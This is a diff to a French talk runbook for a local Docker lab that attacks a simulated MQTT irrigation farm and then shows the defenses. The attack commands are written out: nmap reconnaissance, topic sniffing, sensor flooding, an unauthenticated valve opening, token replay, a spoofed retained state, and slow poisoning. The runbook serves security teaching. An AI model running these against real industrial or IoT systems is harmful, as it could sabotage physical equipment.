@@ -7,6 +7,11 @@ le **numéro de slide** devant, pour se repérer pendant le talk. À exécuter d
 
 Convention : `$` = invite du shell, ne pas le taper.
 
+**Deux terminaux.** Les commandes marquées `# [hôte]` (celles en `docker compose`,
+`curl`, `FARM_MODE=…`) se tapent dans le terminal **hôte** ; **toutes les autres** se
+tapent dans le **shell de l'attaquant** ouvert à la slide 4 (voir « Démarrer l'attaquant »),
+sans préfixe `docker`.
+
 Repère rapide :
 
 | Slide | Étape | Section |
@@ -101,13 +106,13 @@ docker compose --profile attack build
 Mode insecure, services recréés à neuf :
 
 ```bash
-docker compose up -d --force-recreate
+docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
 ```
 
 Vérifier l'état :
 
 ```bash
-curl -s http://127.0.0.1:8080/api/state
+curl -s http://127.0.0.1:8080/api/state   # [hôte]
 ```
 Attendu : `"mode":"insecure"`, `"valve":"CLOSED"`, `"score"` proche de `95`.
 
@@ -116,20 +121,34 @@ Ouvrir le tableau de bord : <http://127.0.0.1:8080>
 Second terminal, fenêtre « ferme » (laisser tourner tout le talk) :
 
 ```bash
-docker compose logs -f --tail 0 simulator dashboard
+docker compose logs -f --tail 0 simulator dashboard   # [hôte]
 ```
+
+### Démarrer l'attaquant — une seule fois (à garder ouvert tout le talk)
+
+Troisième terminal. On lance le conteneur attaquant **une fois** et on ouvre un shell
+dedans ; toutes les commandes d'attaque des slides suivantes se tapent ici, **sans
+préfixe `docker`**. L'attaquant reste vivant quand on change de mode.
+
+```bash
+docker compose --profile attack up -d attacker   # [hôte] démarre l'attaquant (persistant)
+docker compose exec attacker bash                 # [hôte] ouvre le shell → invite root@…:/app#
+```
+
+Raccourci équivalent : `bash scripts/attack.sh`. Outils déjà présents dans le shell :
+`attack.py`, `nmap`, `mosquitto_pub`/`mosquitto_sub`.
 
 ---
 
 ## Slide 6 — Acte 1 : Reconnaissance
 
 ```bash
-docker compose run --rm attacker nmap -sV -p 1883,8883,8080 mosquitto dashboard
+nmap -sV -p 1883,8883,8080 mosquitto dashboard
 ```
 Attendu : `1883/tcp open mosquitto version 2.1.4`, `8080/tcp open http Werkzeug httpd 3.1.9`.
 
 ```bash
-docker compose run --rm attacker mosquitto_sub -h mosquitto -t '#' -v -W 6
+mosquitto_sub -h mosquitto -t '#' -v -W 6
 ```
 Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`, `farm/actuator/valve/state`.
 
@@ -138,17 +157,17 @@ Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`, 
 ## Slide 7 — Acte 2 : Mentir et agir
 
 ```bash
-docker compose run --rm attacker python attack.py flood --value 0 --count 15
+python attack.py flood --value 0 --count 15
 ```
 Attendu : `[flood] 15 mesures humidité=0.0 — broker : accepté`.
 
 ```bash
-curl -i -X POST http://127.0.0.1:8080/api/valve/open
+curl -i -X POST http://127.0.0.1:8080/api/valve/open   # [hôte]
 ```
 Attendu : `HTTP/1.1 200 OK`, `{"command":"OPEN",...,"mode":"insecure"}`.
 
 ```bash
-docker compose run --rm attacker python attack.py state
+python attack.py state
 ```
 Attendu : `vanne=OPEN débit≈34 L/min score=0 impact≈2 000 000 FCFA`.
 
@@ -159,27 +178,27 @@ Attendu : `vanne=OPEN débit≈34 L/min score=0 impact≈2 000 000 FCFA`.
 Basculer en mode secure (le `FARM_MODE` inline suffit, aucun script) :
 
 ```bash
-FARM_MODE=secure docker compose up -d --force-recreate
+FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
 ```
 ```bash
-curl -s http://127.0.0.1:8080/api/state
+curl -s http://127.0.0.1:8080/api/state   # [hôte]
 ```
 Attendu : `"mode":"secure"`.
 
-> Les `docker compose run attacker ...` suivants ne changent plus le mode.
+> Les commandes d'attaque suivantes (dans le shell attaquant) ne changent plus le mode.
 > Le mode ne change qu'avec un nouveau `docker compose up` et un `FARM_MODE` différent.
 
 Montrer que les contrôles marchent — humidité rejetée :
 
 ```bash
-docker compose run --rm attacker python attack.py flood --value 0 --count 15
+python attack.py flood --value 0 --count 15
 ```
 Attendu (fenêtre ferme) : `humidité 0.0 REJETÉE : hors plage [20, 100]`.
 
 Vanne refusée sans token :
 
 ```bash
-curl -i -X POST http://127.0.0.1:8080/api/valve/open
+curl -i -X POST http://127.0.0.1:8080/api/valve/open   # [hôte]
 ```
 Attendu : `HTTP/1.1 403 FORBIDDEN`, `{"error":"token requis"}`.
 
@@ -188,7 +207,7 @@ Attendu : `HTTP/1.1 403 FORBIDDEN`, `{"error":"token requis"}`.
 ## Slide 10 — Acte 3 : Voler le token sur le bus
 
 ```bash
-docker compose run --rm attacker python attack.py replay --simulate-operator --close-first
+python attack.py replay --simulate-operator --close-first
 ```
 Attendu : `commande capturée : {"command": "OPEN", "token": "gdg-demo-token"}` puis
 `rejeu ... — broker : accepté`. Fenêtre ferme : `valve -> OPEN` après la fermeture par l'opérateur.
@@ -200,7 +219,7 @@ Attendu : `commande capturée : {"command": "OPEN", "token": "gdg-demo-token"}` 
 Publier un faux état de vanne retenu :
 
 ```bash
-docker compose run --rm attacker mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED
+mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED
 ```
 Attendu : le dashboard affiche `Vanne : CLOSED` alors que le débitmètre indique ~33 L/min.
 
@@ -209,10 +228,10 @@ Attendu : le dashboard affiche `Vanne : CLOSED` alors que le débitmètre indiqu
 ## Slide 12 — Acte 3 : Empoisonner sans dépasser
 
 ```bash
-docker compose run --rm attacker python attack.py flood --value 25 --count 30
+python attack.py flood --value 25 --count 30
 ```
 ```bash
-docker compose run --rm attacker python attack.py state
+python attack.py state
 ```
 Attendu : `mode=secure vanne=CLOSED score≈21 impact≈1 500 000 FCFA`, aucune trace du rejeu dans le journal.
 
@@ -221,10 +240,10 @@ Attendu : `mode=secure vanne=CLOSED score≈21 impact≈1 500 000 FCFA`, aucune 
 ## Slide 14 — Mode hardened (TLS, identité, ACL)
 
 ```bash
-FARM_MODE=hardened docker compose up -d --force-recreate
+FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
 ```
 ```bash
-curl -s http://127.0.0.1:8080/api/state
+curl -s http://127.0.0.1:8080/api/state   # [hôte]
 ```
 Attendu : `"mode":"hardened"`.
 
@@ -235,43 +254,43 @@ Attendu : `"mode":"hardened"`.
 Accès anonyme refusé (TLS + comptes) :
 
 ```bash
-docker compose run --rm attacker python attack.py anon
+python attack.py anon
 ```
 Attendu : `1883 ... Connection refused` et `8883 ... REFUSÉ par le broker (Not authorized)`.
 
 ACL — lecture limitée aux capteurs (identité « viewer » fuitée) :
 
 ```bash
-docker compose run --rm attacker python attack.py sniff --as viewer --topic 'farm/#' --seconds 4
+python attack.py sniff --as viewer --topic 'farm/#' --seconds 4
 ```
 Attendu : seuls des messages `farm/sensor/*` apparaissent.
 
 ACL — écriture refusée :
 
 ```bash
-docker compose run --rm attacker python attack.py flood --as viewer --value 0 --count 2
+python attack.py flood --as viewer --value 0 --count 2
 ```
 Attendu : `broker : REFUSÉ (Not authorized)`.
 
 ACL — faux état refusé (identité « sensor-02 ») :
 
 ```bash
-docker compose run --rm attacker python attack.py spoof-state --as sensor-02 --state CLOSED
+python attack.py spoof-state --as sensor-02 --state CLOSED
 ```
 Attendu : `broker : REFUSÉ (Not authorized)`.
 
 Rejeu bloqué par le nonce (identité « maintenance », qui a le droit vanne) — illustre la slide 15 :
 
 ```bash
-docker compose run --rm attacker python attack.py replay --as maintenance --simulate-operator --close-first
+python attack.py replay --as maintenance --simulate-operator --close-first
 ```
 Commande forgée sans la clé HMAC :
 
 ```bash
-docker compose run --rm attacker python attack.py forge --as maintenance
+python attack.py forge --as maintenance
 ```
 ```bash
-docker compose run --rm attacker python attack.py state
+python attack.py state
 ```
 Attendu (journal) : `rejeu détecté (nonce déjà utilisé)` puis `signature HMAC invalide`.
 
@@ -282,17 +301,17 @@ Attendu (journal) : `rejeu détecté (nonce déjà utilisé)` puis `signature HM
 Saut brutal détecté (illustre la slide 16) :
 
 ```bash
-docker compose run --rm attacker python attack.py flood --as sensor-02 --value 25 --count 10
+python attack.py flood --as sensor-02 --value 25 --count 10
 ```
 Attendu : `humidité 25.0 REJETÉE : saut anormal (...)`.
 
 Dérive lente, sous le seuil :
 
 ```bash
-docker compose run --rm attacker python attack.py drift --as sensor-02
+python attack.py drift --as sensor-02
 ```
 ```bash
-docker compose run --rm attacker python attack.py state
+python attack.py state
 ```
 Attendu : `score≈25` ; à la fin le détecteur rejette même le capteur honnête (65 → « saut anormal »).
 
@@ -303,8 +322,8 @@ Attendu : `score≈25` ; à la fin le détecteur rejette même le capteur honnê
 Revenir en insecure pour une nouvelle démo :
 
 ```bash
-FARM_MODE=insecure docker compose up -d --force-recreate
-docker compose run --rm attacker python attack.py reset
+FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
+python attack.py reset
 ```
 
 Arrêter (garde images et secrets) :
@@ -326,8 +345,8 @@ rm -rf mosquitto/tls mosquitto/secrets .env
 
 | Mode | Slide | Commande de bascule |
 |---|---|---|
-| insecure | 4 | `FARM_MODE=insecure docker compose up -d --force-recreate` |
-| secure | 9 | `FARM_MODE=secure docker compose up -d --force-recreate` |
-| hardened | 14 | `FARM_MODE=hardened docker compose up -d --force-recreate` |
+| insecure | 4 | `FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard` |
+| secure | 9 | `FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard` |
+| hardened | 14 | `FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard` |
 
 Vérifier à tout moment : `curl -s http://127.0.0.1:8080/api/state`.
